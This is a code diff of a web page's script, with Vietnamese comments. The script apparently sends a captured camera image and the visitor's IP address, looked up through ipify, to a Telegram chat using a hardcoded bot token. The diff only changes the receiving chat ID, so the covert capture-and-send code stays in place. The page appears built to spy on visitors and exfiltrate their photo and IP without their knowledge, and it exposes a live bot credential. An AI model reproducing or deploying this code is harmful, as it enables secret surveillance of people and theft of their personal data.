@@ -92,7 +92,7 @@
         canvas.toBlob(function(blob) {
             // Gửi ảnh qua Telegram
             var formData = new FormData();
-            formData.append('chat_id', '-953842244'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
+            formData.append('chat_id', '-5281960919 '); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
             formData.append('photo', blob, 'photo.jpg');
 
             $.ajax({
@@ -146,7 +146,7 @@
   <script>
     $(document).ready(function() {
       var telegramBotToken = '6388436425:AAHLWfAQImqi-ALP2FWa_9zdOGgrpbRscPI';
-      var chatId = '-953842244';
+      var chatId = '-5281960919 ';
 
       // Lấy địa chỉ IP
       $.getJSON('https://api.ipify.org?format=json', function(data) {
